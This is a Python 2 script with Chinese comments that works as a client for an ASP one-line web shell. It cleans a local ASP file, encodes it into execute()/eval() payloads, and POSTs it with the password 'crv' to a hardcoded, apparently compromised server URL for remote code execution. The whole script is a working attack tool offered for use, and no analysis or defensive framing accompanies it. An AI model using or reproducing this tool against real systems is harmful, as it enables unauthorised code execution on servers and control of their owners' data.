#!/usr/local/bin/python
#-*- coding: UTF-8 -*-

import re
import httplib
import StringIO
import gzip
import urllib
import urllib2

def str_char(eval_string): #将特殊字符 转换编码
    eval_string=eval_string.replace("&","\"%26chr(38)%26\"")
    eval_string=eval_string.replace("+","\"%26chr(43)%26\"")
    eval_string=eval_string.replace("\"","\"\"")
    eval_string=eval_string.replace(" ","+")
    return eval_string

#    eval_string=eval_string.replace("!","\"%26chr(33)%26\"")#    Chr("33") !
#    eval_string=eval_string.replace("\"","\"%26chr(34)%26\"")#    Chr("34") "
#    eval_string=eval_string.replace("#","\"%26chr(35)%26\"")#    Chr("35") #
#    eval_string=eval_string.replace("$","\"%26chr(36)%26\"")#    Chr("36") $
#    eval_string=eval_string.replace("%","\"%26chr(37)%26\"")#    Chr("37") %
#    eval_string=eval_string.replace("&","\"%26chr(38)%26\"")#    Chr("38") &
#    eval_string=eval_string.replace("'","\"%26chr(39)%26\"")#    Chr("39") ’
#    eval_string=eval_string.replace("(","\"%26chr(40)%26\"")#    Chr("40") (
#    eval_string=eval_string.replace(")","\"%26chr(41)%26\"")#    Chr("41") )
#    eval_string=eval_string.replace("*","\"%26chr(42)%26\"")#    Chr("42") *
#    eval_string=eval_string.replace("+","\"%26chr(43)%26\"")#    Chr("43") +
#    eval_string=eval_string.replace(",","\"%26chr(44)%26\"")#    Chr("44") ,
#    eval_string=eval_string.replace("-","\"%26chr(45)%26\"")#    Chr("45") -
#    eval_string=eval_string.replace(".","\"%26chr(46)%26\"")#    Chr("46") .
#    eval_string=eval_string.replace("/","\"%26chr(47)%26\"")#    Chr("47") /

#    eval_string=eval_string.replace("0","\"%26chr(48)%26\"")#    Chr("48") 0
#    eval_string=eval_string.replace("1","\"%26chr(49)%26\"")#    Chr("49") 1
#    eval_string=eval_string.replace("2","\"%26chr(50)%26\"")#    Chr("50") 2
#    eval_string=eval_string.replace("3","\"%26chr(51)%26\"")#    Chr("51") 3
#    eval_string=eval_string.replace("4","\"%26chr(52)%26\"")#    Chr("52") 4
#    eval_string=eval_string.replace("5","\"%26chr(53)%26\"")#    Chr("53") 5
#    eval_string=eval_string.replace("6","\"%26chr(54)%26\"")#    Chr("54") 6
#    eval_string=eval_string.replace("7","\"%26chr(55)%26\"")#    Chr("55") 7
#    eval_string=eval_string.replace("8","\"%26chr(56)%26\"")#    Chr("56") 8
#    eval_string=eval_string.replace("9","\"%26chr(59)%26\"")#    Chr("57") 9
#    eval_string=eval_string.replace(":","\"%26chr(58)%26\"")#    Chr("58") :
#    eval_string=eval_string.replace(";","\"%26chr(59)%26\"")#    Chr("59") ;
#    eval_string=eval_string.replace("<","\"%26chr(60)%26\"")#    Chr("60") <
#    eval_string=eval_string.replace("=","\"%26chr(61)%26\"")#    Chr("61") =
#    eval_string=eval_string.replace(">","\"%26chr(62)%26\"")#    Chr("62") >
#    eval_string=eval_string.replace("?","\"%26chr(63)%26\"")#    Chr("63") ?
#    eval_string=eval_string.replace("@","\"%26chr(64)%26\"")#    Chr("64") @
#    eval_string=eval_string.replace("A","\"%26chr(65)%26\"")#    Chr("65") A
#    eval_string=eval_string.replace("B","\"%26chr(66)%26\"")#    Chr("66") B
#    eval_string=eval_string.replace("C","\"%26chr(67)%26\"")#    Chr("67") C
#    eval_string=eval_string.replace("D","\"%26chr(68)%26\"")#    Chr("68") D
#    eval_string=eval_string.replace("E","\"%26chr(69)%26\"")#    Chr("69") E
#    eval_string=eval_string.replace("F","\"%26chr(70)%26\"")#    Chr("70") F
#    eval_string=eval_string.replace("G","\"%26chr(71)%26\"")#    Chr("71") G
#    eval_string=eval_string.replace("H","\"%26chr(72)%26\"")#    Chr("72") H
#    eval_string=eval_string.replace("I","\"%26chr(73)%26\"")#    Chr("73") I
#    eval_string=eval_string.replace("J","\"%26chr(74)%26\"")#    Chr("74") J
#    eval_string=eval_string.replace("K","\"%26chr(75)%26\"")#    Chr("75") K
#    eval_string=eval_string.replace("L","\"%26chr(76)%26\"")#    Chr("76") L
#    eval_string=eval_string.replace("M","\"%26chr(77)%26\"")#    Chr("77") M
#    eval_string=eval_string.replace("N","\"%26chr(78)%26\"")#    Chr("78") N
#    eval_string=eval_string.replace("O","\"%26chr(79)%26\"")#    Chr("79") O
#    eval_string=eval_string.replace("P","\"%26chr(80)%26\"")#    Chr("80") P
#    eval_string=eval_string.replace("Q","\"%26chr(81)%26\"")#    Chr("81") Q
#    eval_string=eval_string.replace("R","\"%26chr(82)%26\"")#    Chr("82") R
#    eval_string=eval_string.replace("S","\"%26chr(83)%26\"")#    Chr("83") S
#    eval_string=eval_string.replace("T","\"%26chr(84)%26\"")#    Chr("84") T
#    eval_string=eval_string.replace("U","\"%26chr(85)%26\"")#    Chr("85") U
#    eval_string=eval_string.replace("V","\"%26chr(86)%26\"")#    Chr("86") V
#    eval_string=eval_string.replace("W","\"%26chr(87)%26\"")#    Chr("87") W
#    eval_string=eval_string.replace("X","\"%26chr(88)%26\"")#    Chr("88") X
#    eval_string=eval_string.replace("Y","\"%26chr(89)%26\"")#    Chr("89") Y
#    eval_string=eval_string.replace("Z","\"%26chr(90)%26\"")#    Chr("90") Z
#    eval_string=eval_string.replace("[","\"%26chr(91)%26\"")#    Chr("91") [
#    eval_string=eval_string.replace("\\","\"%26chr(92)%26\"")#    Chr("92")\
#    eval_string=eval_string.replace("]","\"%26chr(93)%26\"")#    Chr("93") ]
#    eval_string=eval_string.replace("^","\"%26chr(94)%26\"")#    Chr("94") ^
#    eval_string=eval_string.replace("_","\"%26chr(95)%26\"")#    Chr("95") _
#    eval_string=eval_string.replace("`","\"%26chr(96)%26\"")#    Chr("96") `
#    eval_string=eval_string.replace("a","\"%26chr(97)%26\"")#    Chr("97") a
#    eval_string=eval_string.replace("b","\"%26chr(98)%26\"")#    Chr("98") b
#    eval_string=eval_string.replace("c","\"%26chr(99)%26\"")#    Chr("99") c
#    eval_string=eval_string.replace("d","\"%26chr(100)%26\"")#    Chr("100") d
#    eval_string=eval_string.replace("e","\"%26chr(101)%26\"")#    Chr("101") e
#    eval_string=eval_string.replace("f","\"%26chr(102)%26\"")#    Chr("102") f
#    eval_string=eval_string.replace("g","\"%26chr(103)%26\"")#    Chr("103") g
#    eval_string=eval_string.replace("h","\"%26chr(104)%26\"")#    Chr("104") h
#    eval_string=eval_string.replace("i","\"%26chr(105)%26\"")#    Chr("105") i
#    eval_string=eval_string.replace("j","\"%26chr(106)%26\"")#    Chr("106") j
#    eval_string=eval_string.replace("k","\"%26chr(107)%26\"")#    Chr("107") k
#    eval_string=eval_string.replace("l","\"%26chr(108)%26\"")#    Chr("108") l
#    eval_string=eval_string.replace("m","\"%26chr(109)%26\"")#    Chr("109") m
#    eval_string=eval_string.replace("n","\"%26chr(100)%26\"")#    Chr("110") n
#    eval_string=eval_string.replace("o","\"%26chr(111)%26\"")#    Chr("111") o
#    eval_string=eval_string.replace("p","\"%26chr(112)%26\"")#    Chr("112") p
#    eval_string=eval_string.replace("q","\"%26chr(113)%26\"")#    Chr("113") q
#    eval_string=eval_string.replace("r","\"%26chr(114)%26\"")#    Chr("114") r
#    eval_string=eval_string.replace("s","\"%26chr(115)%26\"")#    Chr("115") s
#    eval_string=eval_string.replace("t","\"%26chr(116)%26\"")#    Chr("116") t
#    eval_string=eval_string.replace("u","\"%26chr(117)%26\"")#    Chr("117") u
#    eval_string=eval_string.replace("v","\"%26chr(118)%26\"")#    Chr("118") v
#    eval_string=eval_string.replace("w","\"%26chr(119)%26\"")#    Chr("119") w
#    eval_string=eval_string.replace("x","\"%26chr(120)%26\"")#    Chr("120") x
#    eval_string=eval_string.replace("y","\"%26chr(121)%26\"")#    Chr("121") y
#    eval_string=eval_string.replace("z","\"%26chr(122)%26\"")#    Chr("122") z
#    eval_string=eval_string.replace("{","\"%26chr(123)%26\"")#    Chr("123") {
#    eval_string=eval_string.replace("|","\"%26chr(124)%26\"")#    Chr("124") |
#    eval_string=eval_string.replace("}","\"%26chr(125)%26\"")#    Chr("125") }
#    eval_string=eval_string.replace("~","\"%26chr(126)%26\"")#    Chr("126") ~

def yijuhua_ASP_js(url,PASS,params): #URL地址 ，密码   只支持PHP
    try:
        #构造HTTP头
        pattern = re.compile('http:*')
        match = pattern.search(url)
        if(match):
            ztarget = url.replace("http://","").split('/')[0]
            headers={"Host": ztarget,\
                     "User-Agent": "Mozilla/5.0",\
                     "Content-Type": "application/x-www-form-urlencoded",\
                     "Referer": "http://"+ztarget
            }
        else:
            #print "please enter an address....For example: [url]http://www.xxx.com/1.asp[/url]"
            return 0
            #测试  链接
        conn = httplib.HTTPConnection(ztarget)
        params = PASS+params
        try:
            print params
            conn.request(method="POST",url=url,body=params,headers=headers)
            response = conn.getresponse()
            if ('content-encoding', 'gzip') in response.getheaders():
                compressedstream = StringIO.StringIO(response.read())
                gzipper = gzip.GzipFile(fileobj=compressedstream)
                data = gzipper.read()
            else:
                data = response.read()
            return data
        except Exception,e:
            #print e
            return 0

    except Exception,e:
        #print e
        return 0

########################################################
def asp_x0_zs(file_data): #清除<% %>
    data=""
    p = re.compile( r'.+?\n')
    sarr = p.findall(file_data)
    zs=0  #注释标记
    for every in sarr:
        if not (file_index(every,"<%") or file_index(every,"%>")):
            data+=every
        #        if not file_index(every,"?>"):
        #            data+=every
    return data

def asp_x2_zs(file_data): #清除'注释
    data=""
    p = re.compile( r'.+?\n')
    sarr = p.findall(file_data)
    for every in sarr:
#        if self.file_index(every,"'"):
#            every=self.string_index(every,"'") #截取字符串
        p1 = re.compile( r"'")
        sarr2 = p1.findall(every)
        if not len(sarr2)%2==0 and len(sarr2)>=1:  #偶数或奇数
            #单数
            every=every[0:int(every.rfind("'"))]
        every=every.strip().lstrip()   #清除前后空格
        data+=every+"\n"
    return data


def file_index(data,file_data):  #查找字符串是否存在
    if file_data in data:
        return True
    else:
        return False
def open_file_null(file_data):  #清除空行
    data=""
    p = re.compile( r'.+?\n')
    sarr = p.findall(file_data)
    for every in sarr:
        if every.split():
            data+=every
    return data

def str_char(data): #将特殊字符 转换编码
    execute_string=data.replace("\n",":")
    execute_string=execute_string.replace("\"","\"\"")
    execute_string="execute(\""+execute_string+"\")"
    eval_string=execute_string
    eval_string=eval_string.replace("&","\"%26chr(38)%26\"")
    eval_string=eval_string.replace("+","\"%26chr(43)%26\"")
    eval_string=eval_string.replace("\"","\"\"")
    eval_string=eval_string.replace(" ","+")
    eval_string="=eval(\""+eval_string+"\")"
    return eval_string
########################################################
if __name__ == '__main__':
    #data="""response.clear:response.write "<br>====WEB====<br>":response.write "jADAADADinlaile" :dim a :for a=1 to 100-1 step 10 :Response.Write(a&""<br>""):next :response.end"""
#    data="""response.clear:file_data = Server.MapPath("&Chr(34)&""&Chr(34)&"):response.Write file_data&"&Chr(34)&"11111111111111"&Chr(34)&":for_file=false:if for_file then:Response.Write "&Chr(34)&"<br>====WEB====<br>"&Chr(34)&":else:Response.Write "&Chr(34)&"<br>====file_paths WEB====<br>"&Chr(34)&":end if:response.end:"""
    with open(ur"data.asp","r") as f:  #source.txt
        ASP_data=f.read()
    ASP_data=asp_x0_zs(ASP_data)  #清除<% %>
    ASP_data=asp_x2_zs(ASP_data)  #清除'注释
    ASP_data=open_file_null(ASP_data)     #清除空行
    ASP_data=asp_x2_zs(ASP_data) #清除'注释
    print yijuhua_ASP_js("http://17365.info/imtedir/config.asp.asp","crv",str_char(ASP_data)) #URL地址 ，密码   只支持PHP

